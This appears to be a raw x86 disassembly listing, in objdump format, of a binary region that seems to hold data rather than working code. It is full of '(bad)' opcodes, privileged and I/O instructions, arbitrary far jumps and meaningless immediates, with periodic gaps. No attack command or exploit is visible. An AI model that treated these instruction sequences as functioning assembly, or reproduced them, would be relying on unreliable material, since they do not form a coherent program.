  41bf7c:	or     bl,ah
  41bf7e:	jg     0x41bf3c
  41bf80:	push   cs
  41bf81:	imul   esi,DWORD PTR ss:[edx],0xffffffe2
  41bf85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bf86:	pop    es
  41bf87:	retf   0xfd7e
  41bf8a:	rol    al,1
  41bf8c:	jnp    0x41bf72
  41bf8e:	inc    ecx
  41bf8f:	mov    ebp,0x0
	...
  41bff4:	fs jae 0x41c02a
  41bff7:	es aaa 
  41bff9:	data16 jne 0x41c06f
  41bffc:	ins    BYTE PTR es:[edi],dx
  41bffd:	daa    
  41bffe:	mov    cl,0xc1
  41c000:	jmp    0x41c027
  41c002:	push   ecx
  41c003:	xchg   ecx,eax
  41c004:	xor    al,0x29
  41c006:	add    DWORD PTR [eax],eax
  41c008:	add    al,0x1
  41c00a:	add    BYTE PTR [eax],al
  41c00c:	daa    
  41c00d:	lahf   
  41c00e:	inc    esi
  41c00f:	neg    DWORD PTR ds:0x5d6efcba
  41c015:	lods   eax,DWORD PTR ds:[esi]
  41c016:	add    ah,ch
  41c018:	stos   DWORD PTR es:[edi],eax
  41c019:	ja     0x41bfef
  41c01b:	xchg   DWORD PTR [edx],ebx
  41c01d:	mov    ch,0xa5
  41c01f:	push   ss
  41c020:	mov    ds:0xcbc54a90,al
  41c025:	xor    al,0xf5
  41c027:	cmp    DWORD PTR [esi+eiz*4],0x44230076
  41c02e:	mov    ds:0xe14d6a3b,eax
  41c033:	call   0xcbe441b9
  41c038:	pop    eax
  41c039:	pop    ss
  41c03a:	push   ebp
  41c03b:	loope  0x41c078
  41c03d:	mov    edi,0xb8e11f2d
  41c042:	pop    ebp
  41c043:	mov    eax,DWORD PTR [ecx+0x67]
  41c046:	mov    edi,0x8011e27d
  41c04b:	sub    DWORD PTR [ebp+0x5d4b94d0],ebx
  41c051:	cld    
  41c052:	test   DWORD PTR [edi+0x6bae8fed],ebx
  41c058:	add    BYTE PTR [eax-0x6324207d],dl
  41c05e:	xchg   BYTE PTR [ebx],ch
  41c060:	jmp    0x41c00f
  41c062:	fild   WORD PTR [ecx]
  41c064:	and    BYTE PTR [ebx+0x3dee3239],ch
  41c06a:	mov    ecx,DWORD PTR [ebx]
  41c06c:	push   eax
  41c06d:	mov    ecx,0xc6507aaa
  41c072:	pop    esp
  41c073:	mov    ah,0x50
  41c075:	pop    ss
  41c076:	xchg   ebp,eax
  41c077:	add    eax,0xa4a61caa
  41c07c:	add    ch,dl
  41c07e:	lds    edx,FWORD PTR [eax+0x45]
  41c081:	dec    eax
  41c082:	adc    edi,DWORD PTR [edx]
  41c084:	je     0x41c0c7
  41c086:	sub    ebp,DWORD PTR [edi]
  41c088:	dec    esp
  41c089:	jg     0x41c0da
  41c08b:	ins    DWORD PTR es:[edi],dx
  41c08c:	mov    esi,0x69882fee
  41c091:	idiv   BYTE PTR ds:0xc6319bf7
  41c097:	sbb    bl,BYTE PTR [eax+0x7e]
  41c09a:	jl     0x41c109
  41c09c:	or     BYTE PTR [esi-0x6f09c96f],bh
  41c0a2:	xchg   esi,eax
  41c0a3:	xor    al,0xd1
  41c0a5:	and    ch,BYTE PTR [esi-0x71]
  41c0a8:	pop    ss
  41c0a9:	inc    ebp
  41c0aa:	lods   al,BYTE PTR ds:[esi]
  41c0ab:	bound  ebx,QWORD PTR [edi-0x41]
  41c0ae:	cmp    ecx,ebx
  41c0b0:	mov    ebx,0x97072a08
  41c0b5:	sti    
  41c0b6:	mov    esi,0xd20b9ced
  41c0bb:	mov    edx,0x77becd56
  41c0c0:	inc    edx
  41c0c1:	outs   dx,DWORD PTR ds:[esi]
  41c0c2:	imul   ebx,DWORD PTR [edi+0x52],0x50
  41c0c6:	xchg   ebp,eax
  41c0c7:	cdq    
  41c0c8:	inc    eax
  41c0c9:	inc    esi
  41c0ca:	and    DWORD PTR [edx-0x507dd43a],ebp
  41c0d0:	jno    0x41c0fb
  41c0d2:	pminsw mm2,mm4
  41c0d5:	xchg   edi,eax
  41c0d6:	xchg   edi,eax
  41c0d7:	ss inc esp
  41c0d9:	sti    
  41c0da:	(bad)  
  41c0db:	fisttp WORD PTR [edi-0x35665820]
  41c0e1:	mov    ds:0x622021,al
  41c0e6:	scas   al,BYTE PTR es:[edi]
  41c0e7:	out    dx,eax
  41c0e8:	ja     0x41c0b5
  41c0ea:	sbb    eax,0xa5c07daf
  41c0ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c0f0:	bound  ecx,QWORD PTR [esi-0x451a9f35]
  41c0f6:	add    al,0xf2
  41c0f8:	dec    esi
  41c0f9:	mov    al,0x55
  41c0fb:	jmp    0x87a6:0xe3f1985d
  41c102:	cld    
  41c103:	push   eax
  41c104:	jge    0x41c087
  41c106:	push   0x7
  41c108:	and    eax,0x355610db
  41c10d:	lds    eax,FWORD PTR [ecx]
  41c10f:	std    
	...
  41c174:	(bad)  [edx-0x5f]
  41c177:	clc    
  41c178:	mov    bl,0xfb
  41c17a:	fldcw  WORD PTR [ebx+0x3d]
  41c17d:	add    DWORD PTR ds:0x70c5f3e9,eax
  41c183:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c184:	cmp    BYTE PTR [edx],ch
  41c186:	add    DWORD PTR [eax],eax
  41c188:	add    al,0x1
  41c18a:	add    BYTE PTR [eax],al
  41c18c:	ins    DWORD PTR es:[edi],dx
  41c18d:	cmp    cl,BYTE PTR [ebx-0x56]
  41c190:	idiv   BYTE PTR [ebp-0x30]
  41c193:	outs   dx,BYTE PTR ds:[esi]
  41c194:	in     al,0x5f
  41c196:	mov    dh,0x5
  41c198:	add    BYTE PTR [esi-0x2b],0xf0
  41c19c:	jg     0x41c169
  41c19e:	push   esi
  41c19f:	les    esp,FWORD PTR [ecx-0x32]
  41c1a2:	lods   al,BYTE PTR ds:[esi]
  41c1a3:	test   eax,0x92dcfc36
  41c1a9:	ret    0xc20e
  41c1ac:	xor    bl,ch
  41c1ae:	jl     0x41c135
  41c1b0:	ret    0x7865
  41c1b3:	jns    0x41c1f6
  41c1b5:	out    0x95,al
  41c1b7:	(bad)  
  41c1b9:	push   eax
  41c1ba:	mov    eax,ds:0xe8331c15
  41c1bf:	cld    
  41c1c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c1c1:	xlat   BYTE PTR ds:[ebx]
  41c1c2:	mov    ebp,0x999ca158
  41c1c7:	out    0x6,al
  41c1c9:	(bad)  
  41c1ca:	xchg   ecx,eax
  41c1cb:	fsub   DWORD PTR ds:0x219651a7
  41c1d1:	enter  0xa2dc,0x78
  41c1d5:	pop    ds
  41c1d6:	scas   eax,DWORD PTR es:[edi]
  41c1d7:	ret    0xf449
  41c1da:	std    
  41c1db:	gs clc 
  41c1dd:	jge    0x41c1d8
  41c1df:	adc    al,0x5f
  41c1e1:	and    BYTE PTR ds:0xe713,ah
  41c1e6:	mov    ah,al
  41c1e8:	push   0xffffffd1
  41c1ea:	add    DWORD PTR [edi+0x284ebef2],esi
  41c1f0:	push   esi
  41c1f1:	in     eax,dx
  41c1f2:	pop    ds
  41c1f3:	inc    ebp
  41c1f4:	mov    ebp,0x92398f9a
  41c1f9:	push   0xda3f4d8a
  41c1fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c1ff:	dec    edx
  41c200:	pop    ss
  41c201:	jb     0x41c24c
  41c203:	inc    ecx
  41c204:	les    esi,FWORD PTR [ecx]
  41c206:	adc    BYTE PTR [eax],cl
  41c208:	mov    bh,0xaa
  41c20a:	dec    ecx
  41c20b:	pop    ss
  41c20c:	push   ds
  41c20d:	or     eax,0x4b033b8c
  41c212:	mov    ah,0xb8
  41c214:	int3   
  41c215:	jge    0x41c203
  41c217:	icebp  
  41c218:	push   edx
  41c219:	jb     0x41c23f
  41c21b:	out    dx,eax
  41c21c:	(bad)  [eax-0xc]
  41c21f:	adc    al,0xfa
  41c221:	or     dh,BYTE PTR ds:0x3c863d07
  41c227:	or     al,0x3b
  41c229:	(bad)  
  41c22a:	fld    QWORD PTR [edx+0x5f]
  41c22d:	cmp    al,BYTE PTR [edx]
  41c22f:	cmc    
  41c230:	jns    0x41c219
  41c232:	sbb    edi,DWORD PTR [ebx+0x6f]
  41c235:	adc    DWORD PTR [ebx],edi
  41c237:	(bad)  
  41c238:	popf   
  41c239:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c23a:	add    cl,BYTE PTR [edx-0x34]
  41c23d:	add    eax,0xc9e614b
  41c242:	dec    edi
  41c243:	es pop esp
  41c245:	stos   DWORD PTR es:[edi],eax
  41c246:	retf   
  41c247:	shl    BYTE PTR [eax+0x4849db23],0x9a
  41c24e:	ds mov cl,0x59
  41c251:	enter  0x3431,0x5c
  41c255:	mov    dh,0x42
  41c257:	jne    0x41c2b5
  41c259:	fwait
  41c25a:	push   edi
  41c25b:	push   ds
  41c25c:	or     esp,DWORD PTR [ebx+ecx*8-0x52fcf057]
  41c263:	and    ecx,ebp
  41c265:	lds    eax,FWORD PTR [ebx+ecx*1-0x7b9e95b0]
  41c26c:	or     eax,0x66cacc03
  41c271:	les    esi,FWORD PTR es:[ebp+0x6c]
  41c275:	fisttp DWORD PTR [ecx]
  41c277:	mov    dl,0x36
  41c279:	js     0x41c2af
  41c27b:	(bad)  
  41c27d:	mov    ecx,0xeb29378b
  41c282:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c283:	int    0x42
  41c285:	jl     0x41c251
  41c287:	sub    BYTE PTR [esi+edx*8+0x0],dl
  41c28b:	xchg   DWORD PTR [eax+0xf1c420],esp
	...
  41c2f1:	add    BYTE PTR [eax],al
  41c2f3:	add    bl,dh
  41c2f5:	and    ebp,ecx
  41c2f7:	push   ebp
  41c2f8:	(bad)  
  41c2fa:	sti    
  41c2fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c2fc:	enter  0x1a95,0x14
  41c300:	pusha  
  41c301:	ins    DWORD PTR es:[edi],dx
  41c302:	in     eax,0x39
  41c304:	cmp    al,0x2b
  41c306:	add    DWORD PTR [eax],eax
  41c308:	add    al,0x1
  41c30a:	add    BYTE PTR [eax],al
  41c30c:	fwait
  41c30d:	sbb    eax,0xfa4ee503
  41c312:	popa   
  41c313:	sti    
  41c314:	bound  ecx,QWORD PTR [ebx-0xe]
  41c317:	sub    BYTE PTR [ecx],dh
  41c319:	inc    esp
  41c31a:	jmp    0x41c38e
  41c31c:	loope  0x41c305
  41c31e:	inc    esi
  41c31f:	cmp    edx,DWORD PTR [ebx]
  41c321:	sbb    al,0xbb
  41c323:	mov    ecx,0xc9ca0daa
  41c328:	in     al,0xa4
  41c32a:	pop    edx
  41c32b:	enter  0x5cd1,0xed
  41c32f:	icebp  
  41c330:	js     0x41c31a
  41c332:	and    DWORD PTR [eax-0x6937e59f],esp
  41c338:	jle    0x41c31f
  41c33a:	adc    dl,BYTE PTR [ebp+0x3b]
  41c33d:	xchg   esp,eax
  41c33e:	repnz dec ebx
  41c340:	fsubr  st,st(7)
  41c342:	stc    
  41c343:	sub    eax,0x6b728b07
  41c348:	aam    0xcf
  41c34a:	call   0x857a:0x4ca224aa
  41c351:	scas   eax,DWORD PTR es:[edi]
  41c352:	pop    edx
  41c353:	sbb    BYTE PTR [ebx],dl
  41c355:	in     al,dx
  41c356:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c357:	jmp    0x41c2de
  41c359:	sbb    al,BYTE PTR [esi+0x7a]
  41c35c:	imul   ebx,DWORD PTR [eax-0x8d84986],0x2c
  41c363:	pop    esi
  41c364:	es loop 0x41c3a2
  41c367:	aas    
  41c368:	mov    edi,0xafcfe8da
  41c36d:	mov    bl,0xd3
  41c36f:	addr16 loopne 0x41c2fd
  41c372:	popa   
  41c373:	fsub   QWORD PTR [eax-0x517dd1bb]
  41c379:	aas    
  41c37a:	repz mov dh,0x12
  41c37d:	scas   eax,DWORD PTR es:[edi]
  41c37e:	and    eax,0x858fd752
  41c383:	lods   al,BYTE PTR ds:[esi]
  41c384:	xor    al,0xd8
  41c386:	push   ds
  41c387:	pop    edx
  41c388:	shl    BYTE PTR [eax+0x4e96103],1
  41c38e:	cmp    al,0x4a
  41c390:	push   cs
  41c391:	ret    
  41c392:	hlt    
  41c393:	(bad)  
  41c394:	fwait
  41c395:	cmova  edx,DWORD PTR [esi]
  41c398:	sbb    DWORD PTR [ebx+0x2],0xffffffb5
  41c39c:	div    DWORD PTR [ebx]
  41c39e:	push   cs
  41c39f:	push   eax
  41c3a0:	mov    ds:0xb5552b63,al
  41c3a5:	jecxz  0x41c376
  41c3a7:	inc    ebx
  41c3a8:	scas   eax,DWORD PTR es:[edi]
  41c3a9:	sbb    edx,edi
  41c3ab:	pop    esi
  41c3ac:	add    al,0x97
  41c3ae:	pinsrw mm4,esi,0x65
  41c3b2:	jg     0x41c397
  41c3b4:	jnp    0x41c342
  41c3b6:	push   ebx
  41c3b7:	scas   eax,DWORD PTR es:[edi]
  41c3b8:	nop
  41c3b9:	adc    al,0x10
  41c3bb:	jae    0x41c40c
  41c3bd:	ror    ebp,0x95
  41c3c0:	adc    DWORD PTR [edx+0x58],ecx
  41c3c3:	psubsw mm5,mm0
  41c3c6:	cli    
  41c3c7:	repz rcl BYTE PTR [esi],0x17
  41c3cb:	rcr    DWORD PTR [ecx],0x52
  41c3ce:	aam    0x70
  41c3d0:	adc    cl,ch
  41c3d2:	lods   al,BYTE PTR ds:[esi]
  41c3d3:	mov    DWORD PTR [ebp-0x709c0bd9],ebp
  41c3d9:	loope  0x41c378
  41c3db:	shl    BYTE PTR [ecx+0x8],0x6b
  41c3df:	test   BYTE PTR [ebp-0x72],ah
  41c3e2:	adc    dl,dh
  41c3e4:	sub    ecx,DWORD PTR ds:0x9ea89784
  41c3ea:	mov    ch,0x7a
  41c3ec:	cld    
  41c3ed:	add    ecx,eax
  41c3ef:	in     eax,0xb0
  41c3f1:	out    0xdf,eax
  41c3f3:	stc    
  41c3f4:	ds sbb dl,dl
  41c3f7:	lods   al,BYTE PTR ds:[esi]
  41c3f8:	cmc    
  41c3f9:	stos   BYTE PTR es:[edi],al
  41c3fa:	mov    BYTE PTR fs:[esp+ecx*4+0x5d426ff4],dl
  41c402:	sbb    BYTE PTR [eax+0x4b],ah
  41c405:	sbb    DWORD PTR [edx-0x46],esp
  41c408:	xor    esp,DWORD PTR [esi+ecx*1]
  41c40b:	push   0xffffffb2
  41c40d:	imul   edx,DWORD PTR [eax],0xa4
	...
  41c473:	add    BYTE PTR [ebx+0x20],dl
  41c476:	mov    al,ds:0x5faef3ae
  41c47b:	std    
  41c47c:	mov    bl,0x35
  41c47e:	dec    ebp
  41c47f:	push   ecx
  41c480:	dec    eax
  41c481:	push   eax
  41c482:	mov    ebp,0x12c4077
  41c487:	add    BYTE PTR [ecx+eax*1],al
  41c48a:	add    BYTE PTR [eax],al
  41c48c:	mov    bl,0xa5
  41c48e:	mov    dh,0xa3
  41c490:	ja     0x41c452
  41c492:	sub    esi,DWORD PTR [edi]
  41c494:	test   BYTE PTR [esi+0x77597ba5],dl
  41c49a:	ins    DWORD PTR es:[edi],dx
  41c49b:	cmp    BYTE PTR [edx-0x39],ah
  41c49e:	adc    cl,BYTE PTR [ebp+0x42]
  41c4a1:	(bad)  
  41c4a2:	push   ss
  41c4a3:	lods   al,BYTE PTR ds:[esi]
  41c4a4:	fwait
  41c4a5:	push   cs
  41c4a6:	jno    0x41c453
  41c4a8:	cld    
  41c4a9:	mov    esi,0xa877de61
  41c4ae:	pushf  
  41c4af:	scas   eax,DWORD PTR es:[edi]
  41c4b0:	jmp    0x41c440
  41c4b2:	scas   al,BYTE PTR es:[edi]
  41c4b3:	or     bl,ah
  41c4b5:	push   edi
  41c4b6:	push   0x53459cd7
  41c4bb:	pop    edi
  41c4bc:	pop    es
  41c4bd:	push   0xfc0fa11e
  41c4c2:	popf   
  41c4c3:	(bad)  
  41c4c4:	or     eax,0xa2039f37
  41c4c9:	xor    esp,DWORD PTR [edi-0x6fa642f]
  41c4cf:	leave  
  41c4d0:	mov    dl,0xd9
  41c4d2:	(bad)  
  41c4d3:	mov    eax,0xde3cfa88
  41c4d8:	adc    al,0x22
  41c4da:	ret    
  41c4db:	into   
  41c4dc:	and    eax,0x85f79766
  41c4e1:	jle    0x41c4fe
  41c4e3:	out    0x4c,al
  41c4e5:	jl     0x41c552
  41c4e7:	in     eax,0x92
  41c4e9:	inc    esp
  41c4ea:	and    cl,dl
  41c4ec:	inc    esi
  41c4ed:	cmp    eax,0x1ef1748f
  41c4f2:	or     esp,0xb4834d2
  41c4f8:	adc    DWORD PTR [eax+esi*4],ebp
  41c4fb:	sbb    eax,0xc6e8a5da
  41c500:	daa    
  41c501:	mov    esp,0xf7e25107
  41c506:	xor    ah,BYTE PTR [ebp+0x1cd041fb]
  41c50c:	mov    db0,ebp
  41c50f:	mov    al,ds:0x996ea610
  41c514:	add    al,0xc6
  41c516:	rol    BYTE PTR [esi-0x8],1
  41c519:	inc    ebp
  41c51a:	arpl   sp,bx
  41c51c:	ins    BYTE PTR es:[edi],dx
  41c51d:	xchg   ebx,ebx
  41c51f:	jb     0x41c4e3
  41c521:	dec    BYTE PTR [ecx+0x1b]
  41c524:	js     0x41c50d
  41c526:	popa   
  41c527:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c528:	lods   eax,DWORD PTR ds:[esi]
  41c529:	mov    ecx,0x713e971b
  41c52e:	loop   0x41c4ce
  41c530:	sbb    ebp,DWORD PTR [esi+0x4afa1e09]
  41c536:	and    al,0x7c
  41c538:	scas   al,BYTE PTR es:[edi]
  41c539:	mov    dh,0xec
  41c53b:	pop    esi
  41c53c:	fsub   QWORD PTR [edi+ebp*1-0x25]
  41c540:	sbb    al,0x50
  41c542:	out    dx,eax
  41c543:	daa    
  41c544:	xor    eax,0x2dee7b7c
  41c549:	(bad)  
  41c54a:	xor    eax,0xb6c3641
  41c54f:	push   ss
  41c550:	cdq    
  41c551:	jmp    0x8f36:0x93ecf787
  41c558:	sub    DWORD PTR [eax+0x47397edf],ebp
  41c55e:	lds    ebx,FWORD PTR [ebx-0x13f6c654]
  41c564:	scas   al,BYTE PTR es:[edi]
  41c565:	cmp    esp,DWORD PTR [esi-0x7e42b212]
  41c56b:	shl    DWORD PTR [eax+0x175b7b64],1
  41c571:	adc    al,0x48
  41c573:	shr    BYTE PTR [edi+0x6ff6f0c5],cl
  41c579:	push   edi
  41c57a:	stos   BYTE PTR es:[edi],al
  41c57b:	shl    DWORD PTR [edx],1
  41c57d:	jmp    0x41c52a
  41c57f:	mov    edi,0x14cff2bf
  41c584:	jg     0x41c549
  41c586:	xchg   esp,eax
  41c587:	daa    
  41c588:	repnz cmp al,0x65
  41c58b:	sbb    ebx,ebx
  41c58d:	and    eax,0xe66
	...
  41c5f2:	add    BYTE PTR [eax],al
  41c5f4:	lds    esp,FWORD PTR [ebx]
  41c5f6:	xchg   ecx,eax
  41c5f7:	and    eax,0xe3f5b7f7
  41c5fc:	inc    ebx
  41c5fd:	and    ch,ch
  41c5ff:	call   0x2d44:0x7d8a19bc
  41c606:	add    DWORD PTR [eax],eax
  41c608:	add    al,0x1
  41c60a:	add    BYTE PTR [eax],al
  41c60c:	mov    gs,ebx
  41c60e:	ja     0x41c65c
  41c610:	dec    eax
  41c611:	mov    ebx,0x467da940
  41c616:	ficom  WORD PTR [ecx+eiz*1+0x575fa6c]
  41c61d:	jg     0x41c611
  41c61f:	sub    BYTE PTR [eax],dh
  41c621:	jl     0x41c603
  41c623:	loope  0x41c5f6
  41c625:	adc    DWORD PTR [ecx-0x79009ec5],ecx
  41c62b:	cld    
  41c62c:	cmp    DWORD PTR [edx+ebp*2+0x1a],eax
  41c630:	jmp    0xc5cb8098
  41c635:	mov    cs,WORD PTR [ecx-0x2f]
  41c638:	xor    al,0x26
  41c63a:	inc    edi
  41c63b:	push   es
  41c63c:	mov    dl,0xb9
  41c63e:	pop    ecx
  41c63f:	or     edi,esp
  41c641:	popa   
  41c642:	inc    esp
  41c643:	lahf   
  41c644:	and    al,0x73
  41c646:	inc    edi
  41c647:	inc    esi
  41c648:	jmp    0x41c6c4
  41c64a:	sub    al,BYTE PTR [edi]
  41c64c:	and    eax,0x76167ef1
  41c651:	sub    eax,0xa5750983
  41c656:	dec    eax
  41c657:	popa   
  41c658:	mov    edi,0xbee37251
  41c65d:	(bad)  
  41c65e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c65f:	push   esi
  41c660:	sar    BYTE PTR [edi],cl
  41c662:	aad    0xb9
  41c664:	fistp  WORD PTR [edi+0x1b0f510e]
  41c66a:	and    eax,DWORD PTR [ebp-0x61b61ea0]
  41c670:	push   0x8791a145
  41c675:	shl    BYTE PTR [esp+edi*1],0xa
  41c679:	in     al,dx
  41c67a:	aas    
  41c67b:	fsub   st(0),st
  41c67d:	pop    ss
  41c67e:	cld    
  41c67f:	out    dx,al
  41c680:	and    DWORD PTR [ebx+eiz*4-0x1],edi
  41c684:	in     al,dx
  41c685:	enter  0xcf2,0xab
  41c689:	mov    bh,0x8b
  41c68b:	jae    0x41c664
  41c68d:	push   ss
  41c68e:	and    dh,cl
  41c690:	sbb    dl,BYTE PTR [edx]
  41c692:	xor    ecx,DWORD PTR gs:0xf05e2eac
  41c699:	inc    eax
  41c69a:	jo     0x41c70b
  41c69c:	popa   
  41c69d:	mov    eax,0xa5f4da61
  41c6a2:	cdq    
  41c6a3:	fldenv [ebx-0x241bdd24]
  41c6a9:	imul   ebp,DWORD PTR [edi*8+0x5ea56215],0x17ee524b
  41c6b4:	outs   dx,BYTE PTR ds:[esi]
  41c6b5:	or     BYTE PTR [edx+0x5f],0x4d
  41c6b9:	or     al,0xff
  41c6bb:	leave  
  41c6bc:	pop    ecx
  41c6bd:	xchg   bh,dl
  41c6bf:	shr    DWORD PTR [ebp+0x4e05ff7],cl
  41c6c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c6c6:	(bad)  
  41c6c7:	and    al,0x6e
  41c6c9:	pop    ebp
  41c6ca:	retf   
  41c6cb:	or     ah,bl
  41c6cd:	adc    DWORD PTR gs:[ecx+0x7fc6034e],esi
  41c6d4:	add    BYTE PTR [ebx],bl
  41c6d6:	adc    ecx,DWORD PTR [eax+0x79b2f4e2]
  41c6dc:	cmc    
  41c6dd:	jle    0x41c73c
  41c6df:	pop    ebp
  41c6e0:	cdq    
  41c6e1:	mov    dl,BYTE PTR [edi+0x7be1b22]
  41c6e7:	(bad)  
  41c6e8:	cmp    ebx,DWORD PTR [ebx+0x6c4220d0]
  41c6ee:	(bad)  
  41c6ef:	push   edx
  41c6f0:	fisubr DWORD PTR [ebx+0x6a451e1]
  41c6f6:	in     al,0x33
  41c6f8:	and    ebx,DWORD PTR [eax-0x4]
  41c6fb:	mov    BYTE PTR [edx+0x4a],dh
  41c6fe:	test   DWORD PTR [ebx-0x15],edx
  41c701:	div    BYTE PTR [edx+0x25]
  41c704:	cld    
  41c705:	mov    bl,0x88
  41c707:	mov    eax,ds:0xe92d58ef
  41c70c:	cmp    BYTE PTR [eax+0x25],0x9a
	...
  41c774:	fiadd  DWORD PTR [ecx]
  41c776:	ret    0xdb86
  41c779:	(bad)  
  41c77a:	ficomp WORD PTR [ebp-0xf]
  41c77d:	cmp    DWORD PTR [esi],esi
  41c77f:	lahf   
  41c780:	mov    WORD PTR [ecx-0x75],es
  41c783:	dec    esi
  41c784:	dec    eax
  41c785:	add    DWORD PTR cs:[eax],eax
  41c788:	add    al,0x1
  41c78a:	add    BYTE PTR [eax],al
  41c78c:	and    BYTE PTR [ecx-0x3a54516],bh
  41c792:	cmp    ch,BYTE PTR [esi+0x3a]
  41c795:	adc    DWORD PTR [ebp-0x1428fba4],esp
  41c79b:	fidiv  WORD PTR [ecx-0x75]
  41c79e:	pop    edx
  41c79f:	fdiv   DWORD PTR [eax]
  41c7a1:	cmp    BYTE PTR [ecx+0x17],ch
  41c7a4:	mov    ecx,0x8e758cd6
  41c7a9:	addr16 fwait
  41c7ab:	jg     0x41c773
  41c7ad:	cmp    DWORD PTR [ecx],ebp
  41c7af:	imul   ebp,DWORD PTR [esi+0x4a26d8b5],0xfffffff6
  41c7b6:	cmp    dl,bh
  41c7b8:	test   al,0xe5
  41c7ba:	jmp    0x2d8153e7
  41c7bf:	loop   0x41c743
  41c7c1:	mov    ch,0x26
  41c7c3:	imul   DWORD PTR [ebx-0x9738d6b]
  41c7c9:	(bad)  
  41c7ca:	ins    BYTE PTR es:[edi],dx
  41c7cb:	or     eax,0x5d2409f1
  41c7d0:	and    BYTE PTR ss:[edi-0x48de0d14],cl
  41c7d7:	inc    ebx
  41c7d8:	sub    al,0xb4
  41c7da:	(bad)  
  41c7db:	mov    ebp,0xc2c3ff9f
  41c7e0:	jg     0x41c774
  41c7e2:	jl     0x41c80f
  41c7e4:	sbb    dh,BYTE PTR [ecx-0x2732544e]
  41c7ea:	js     0x41c7d3
  41c7ec:	cld    
  41c7ed:	pop    esp
  41c7ee:	cmp    al,0x80
  41c7f0:	leave  
  41c7f1:	rcl    DWORD PTR [esp+ebp*8],1
  41c7f4:	popa   
  41c7f5:	add    al,0x8a
  41c7f7:	xchg   ecx,eax
  41c7f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c7f9:	in     al,dx
  41c7fa:	cli    
  41c7fb:	push   es
  41c7fc:	push   es
  41c7fd:	fwait
  41c7fe:	test   al,0x48
  41c800:	gs cld 
  41c802:	add    bh,BYTE PTR [ebx-0x4e71d668]
  41c808:	fcomp  st(7)
  41c80a:	mov    eax,ds:0x65bad16c
  41c80f:	mov    eax,ds:0x1098203b
  41c814:	daa    
  41c815:	and    BYTE PTR [edx+0x4ae3b186],0xff
  41c81c:	cmp    ecx,0xffffffd9
  41c81f:	arpl   ax,bx
  41c821:	jno    0x41c7b6
  41c823:	xchg   esp,eax
  41c824:	dec    ebx
  41c825:	pushf  
  41c826:	sbb    eax,0xb5ab4343
  41c82b:	push   ecx
  41c82c:	adc    dh,BYTE PTR ds:0xa8edcf5a
  41c832:	dec    edx
  41c833:	mov    eax,0x3b167d4b
  41c838:	cmp    al,0xb3
  41c83a:	cmp    esi,ebp
  41c83c:	les    ebp,FWORD PTR [ebx]
  41c83e:	jecxz  0x41c7ed
  41c840:	push   ecx
  41c841:	inc    ebp
  41c842:	sub    al,0x95
  41c844:	adc    BYTE PTR [ebx-0x4d041c28],al
  41c84a:	xchg   ebp,eax
  41c84b:	fbld   TBYTE PTR [edi+0x2812a1ed]
  41c851:	les    edi,FWORD PTR [esi]
  41c853:	push   eax
  41c854:	sbb    eax,0x6bc5b98a
  41c859:	sub    ebp,DWORD PTR [ebp+0x74]
  41c85c:	xor    DWORD PTR [eax-0x487c4a8e],0x6
  41c863:	outs   dx,DWORD PTR ds:[esi]
  41c864:	mov    bl,0x92
  41c866:	je     0x41c87f
  41c868:	push   es
  41c869:	leave  
  41c86a:	loopne 0x41c7fe
  41c86c:	inc    esp
  41c86d:	outs   dx,BYTE PTR ds:[esi]
  41c86e:	imul   eax,ecx,0x22794ab4
  41c874:	push   0x4157a72f
  41c879:	js     0x41c888
  41c87b:	imul   esp,DWORD PTR [ecx-0x3e],0xc586d0bf
  41c882:	les    ebx,FWORD PTR ds:[ebx-0x498c8970]
  41c889:	mov    bh,0x7d
  41c88b:	aas    
  41c88c:	dec    edx
  41c88d:	in     al,0xd
  41c88f:	sub    BYTE PTR [eax],al
	...
  41c8f1:	add    BYTE PTR [eax],al
  41c8f3:	add    BYTE PTR [ebx+0x34],ah
  41c8f6:	lods   eax,DWORD PTR ds:[esi]
  41c8f7:	xor    al,0xff
  41c8f9:	mov    ebp,0x291877fb
  41c8fe:	cmp    eax,DWORD PTR [ecx]
  41c900:	xchg   ch,ah
  41c902:	imul   edi,DWORD PTR [edi],0x12f4c
  41c908:	add    al,0x1
  41c90a:	add    BYTE PTR [eax],al
  41c90c:	pop    es
  41c90d:	and    ebp,DWORD PTR [ecx-0x32]
  41c910:	push   ss
  41c911:	int3   
  41c912:	xlat   BYTE PTR ds:[ebx]
  41c913:	inc    BYTE PTR [eax+ebp*1-0x2ccc225a]
  41c91a:	scas   al,BYTE PTR es:[edi]
  41c91b:	adc    BYTE PTR [edi],dh
  41c91d:	fisubr DWORD PTR [ecx+0x68]
  41c920:	scas   eax,DWORD PTR es:[edi]
  41c921:	sub    eax,0xce0e8fbf
  41c926:	and    BYTE PTR [ebp-0x6c04a336],cl
  41c92c:	mov    dl,0x8e
  41c92e:	mov    edx,0x428a36bc
  41c933:	push   edx
  41c934:	cli    
  41c935:	mov    esp,0x38647f20
  41c93a:	mov    WORD PTR ds:0xdef2b339,?
  41c940:	push   ebx
  41c941:	mov    ebx,0x28808cfb
  41c946:	aad    0xa9
  41c948:	push   0xffffffc3
  41c94a:	loopne 0x41c911
  41c94c:	pop    eax
  41c94d:	xor    edx,DWORD PTR [ecx+0x79f1718e]
  41c953:	ins    BYTE PTR es:[edi],dx
  41c954:	add    dl,BYTE PTR [esp+edx*2-0x6e1b04f7]
  41c95b:	rcl    BYTE PTR [edi],1
  41c95d:	sub    al,0xf8
  41c95f:	out    dx,eax
  41c960:	fist   WORD PTR [edx-0x7f]
  41c963:	pop    esi
  41c964:	js     0x41c959
  41c966:	aam    0x1c
  41c968:	call   0xad0eff69
  41c96d:	cli    
  41c96e:	sub    dl,BYTE PTR [esi-0x273e1500]
  41c974:	sub    BYTE PTR [ebx+0x5e],cl
  41c977:	xchg   BYTE PTR [edi],cl
  41c979:	in     al,0xb4
  41c97b:	cwde   
  41c97c:	(bad)  
